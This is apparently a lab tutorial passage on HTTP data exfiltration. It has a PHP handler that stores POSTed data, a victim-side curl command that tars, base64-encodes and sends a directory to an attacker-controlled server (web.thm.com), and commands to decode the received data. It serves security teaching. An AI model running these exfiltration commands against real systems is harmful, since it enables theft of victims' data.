To exfiltrate data over the HTTP protocol, we can apply the following steps:

1. An attacker sets up a web server with a data handler. In our case, it will be web.thm.com and the contact.php page as a data handler.
2. A C2 agent or an attacker sends the data. In our case, we will send data using the curl command.
3. The webserver receives the data and stores it. In our case, the contact.php receives the POST request and stores it into /tmp.
4. The attacker logs into the webserver to have a copy of the received data.

Data handler (contact.php):

	<?php 
		if (isset($_POST['file'])) {
		        $file = fopen("/tmp/http.bs64","w");
		        fwrite($file, $_POST['file']);
		        fclose($file);
		   }
		?>

Victim

	curl --data "file=$(tar zcf - task6 | base64)" http://web.thm.com/contact.php

Webserver

	sudo sed -i 's/ /+/g' /tmp/http.bs64
	cat /tmp/http.bs64 | base64 -d | tar xvfz -